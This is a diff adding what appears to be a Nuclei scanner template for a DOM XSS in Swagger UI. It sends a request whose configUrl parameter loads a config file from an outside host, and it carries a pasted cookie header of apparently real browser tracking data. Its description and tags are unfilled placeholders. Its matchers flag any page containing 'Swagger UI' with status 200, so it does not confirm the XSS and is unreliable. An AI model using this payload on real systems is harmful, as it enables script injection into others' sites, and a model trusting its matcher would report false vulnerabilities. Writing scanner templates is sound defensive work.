@@ -1,0 +1,42 @@
+id: swagger-ui
+
+info:
+  name: swagger-ui-dom-xss
+  author: badhacker0x1
+  severity: high
+  description: description
+  reference:
+    - https://github.com/seanmarpo/webjars-swagger-xss
+  tags: tags
+
+requests:
+  - raw:
+      - |+
+        GET /swagger-ui/index.html?configUrl=https://xss.smarpo.com/test.json HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: s_ecid=MCMID%7C89795248688139442909095754411904983156; AMCV_EFD95E09512D2A8E0A490D4D%40AdobeOrg=-841662559%7CMCIDTS%7C19407%7CMCMID%7C89795248688139442909095754411904983156%7CMCAID%7CNONE%7CMCOPTOUT-1676750181s%7CNONE%7CvVersion%7C4.5.2; FPI=make=Ford&html=false; gt_uid=c586ebef-d0c2-4fe0-b709-84a3154f749f; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Feb+19+2023+20%3A44%3A11+GMT%2B0600+(Bangladesh+Standard+Time)&version=202211.2.0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=1%3A1%2C6%3A1%2C2%3A1%2C4%3A1%2C3%3A1&AwaitingReconsent=false; LPVID=Q4OWNmNjk0NjlkYmU0Mzgw
+        Sec-Ch-Ua: "Chromium";v="110", "Not A(Brand";v="24", "Brave";v="110"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
+        Sec-Gpc: 1
+        Accept-Language: en-GB,en;q=0.7
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - Swagger UI
+      - type: status
+        status:
+          - 200
